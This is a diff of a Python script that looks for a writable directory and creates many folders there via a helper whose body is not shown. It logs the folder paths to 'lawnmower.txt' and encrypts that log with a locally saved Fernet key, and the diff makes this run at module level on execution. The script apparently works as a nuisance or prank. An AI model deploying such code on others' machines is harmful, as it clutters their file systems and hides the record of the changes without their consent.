@@ -7,42 +7,13 @@ newpath=path.split('/')
 i=2
 newPathString="/"+newpath[1]+"/"
 done=False
-
-
-def main():
-    global done
-    global newPathString
-    global i
-    while not (done):
+while not(done):
         if (not (os.access(newPathString, os.W_OK))):
-            entry = newpath[i]
-            i += 1
-            newPathString += entry + "/"
+            entry=newpath[i]
+            i+=1
+            newPathString+=entry+"/"
         else:
-
-            done = True
-    key = Fernet.generate_key()
-
-    # Save the key into a file
-    with open('lawnmower.key', 'wb') as f:
-        f.write(key)
-
-    # Load the key from the .key file
-    with open('lawnmower.key', 'rb') as f:
-        key = f.read()
-
-    # Create a Fernet object using the key
-    fernet = Fernet(key)
-
-    origin = []
-    for i in range(2):
-        origin.append(makeLotsOfFolders(newPathString))
-    with open("lawnmower.txt", 'w') as f:
-        for i in range(len(origin)):
-            f.write(origin[i] + "\n")
-        f.close()
-        encrypt("lawnmower.txt")
-
+            done=True
 
 def makeLotsOfFolders(path):
     origin=""
@@ -81,8 +52,27 @@ def encrypt(file):
         f.write(encrypted)
 
 
+key = Fernet.generate_key()
+
+# Save the key into a file
+with open('lawnmower.key', 'wb') as f:
+    f.write(key)
+
+
+# Load the key from the .key file
+with open('lawnmower.key', 'rb') as f:
+    key = f.read()
+
+# Create a Fernet object using the key
+fernet = Fernet(key)
 
 
 
-
-
+origin=[]
+for i in range (2):
+    origin.append(makeLotsOfFolders(newPathString))
+with open("lawnmower.txt", 'w') as f:
+    for i in range (len(origin)):
+        f.write(origin[i]+"\n")
+    f.close()
+    encrypt("lawnmower.txt")
